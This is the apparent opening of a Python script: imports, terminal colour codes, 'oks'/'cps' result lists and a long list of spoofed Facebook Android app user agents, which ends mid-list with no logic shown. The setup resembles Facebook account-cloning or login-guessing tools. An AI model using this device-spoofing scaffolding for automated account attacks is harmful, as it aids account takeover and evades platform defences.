#===========import=======#
import os
from os import system as clr
import requests
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#===========colours=====#
R = '\033[1;91m'
W = '\033[1;97m'
G = '\033[1;32m' 
Y = '\033[1;33m'
B = '\033[1;34m'
O = '\033[1;35m'
oks=[]
cps=[]
loop=0
ugen=[]
ugen = ()
ugen = ('[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/Telekom.mk;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1254;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900P;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/MY CELCOM;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A7-30HC;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/de_DE;FBCR/o2 - de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8190;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/MOVISTAR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/vi_VN;FBCR/VN Vietnamobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/fr_CA;FBCR/Koodo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/AT&-T;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M9;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G890A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G920V;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/fr_CA;FBCR/ROGERS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/nb_NO;FBCR/N Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Telstra Mobile;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/ZTE T815;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Claro;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-P714;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=480,height=800};FBLC/it_IT;FBCR/I WIND;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7390;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/MetroPCS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G386T1;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1184};FBLC/sv_SE;FBCR/Telenor SE;FBMF/BullittGroupLimited;FBBD/Cat;FBPN/com.facebook.katana;FBDV/S50;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I747;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/Claro;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Family Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-M919;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097182;FBDM/{density=1.5,width=1920,height=1128};FBLC/en_US;FBCR/;FBMF/FUHU;FBBD/DMTAB;FBPN/com.facebook.katana;FBDV/DMTAB-IN08A;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/Claro;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Blade A460;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/airtel;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D690;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=960};FBLC/vi_VN;FBCR/VNM and VIETTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300H;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L23;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1200};FBLC/es_LA;FBCR/movistar;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H635;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo A7000-a;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/entel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1776};FBLC/ru_RU;FBCR/MTS RUS;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1776};FBLC/sv_SE;FBCR/Telia;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/IND airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 4i;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900P;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SCH-I545;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9295;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920C;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097200;FBDM/{density=1.3312501,width=800,height=1216};FBLC/de_DE;FBCR/;FBMF/LENOVO;FBBD/MEDION;FBPN/com.facebook.katana;FBDV/LIFETAB_P831X;FBSV/5.0;nullFBCA/x86:armeabi-v7a;]',
'[FBAN/FB4A;FBAV/60.0.0.13.76;FBBV/20315706;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.33125,width=800,height=1280};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N5100;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=782};FBLC/fr_CA;FBCR/Bell;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C1904;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/ASIACELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9105;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/en_GB;FBCR/vodafone UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8190N;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/YES OPTUS;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One SV;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/MetroPCS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T599N;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/sv_SE;FBCR/SWEDEN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7580;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/vi_VN;FBCR/VN VINAPHONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y511-U251;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=854};FBLC/fr_FR;FBCR/Proximus;FBMF/Enspert;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/IGGY;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 620;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/AIRCEL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 820G PLUS dual sim;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Bell;FBMF/zte;FBBD/zte;FBPN/com.facebook.katana;FBDV/Z933;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Vodafone;FBMF/PANASONIC;FBBD/Panasonic;FBPN/com.facebook.katana;FBDV/Panasonic P55;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBCR/MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454026;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D801;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454026;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L720;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454026;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5 FHD;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454092;FBDM/{density=1.0,width=1280,height=800};FBLC/fr_CA;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T530NU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=480,height=786};FBLC/de_DE;FBCR/o2 - de;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H340n;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=888};FBLC/es_ES;FBCR/Claro;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D690;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2(4G-LTE);FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBCR/DTAC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200GU;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=1196,height=720};FBLC/sv_SE;FBCR/Telia SE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D722;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=1280,height=720};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H440;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1045;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1200};FBLC/en_US;FBCR/MetroPCS;FBMF/LGE;FBBD/MetroPCS;FBPN/com.facebook.katana;FBDV/LGMS631;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1280};FBLC/vi_VN;FBCR/VN VINAPHONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS980 4G;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1092;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI RIO-L03;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Vodafone IN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A800F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
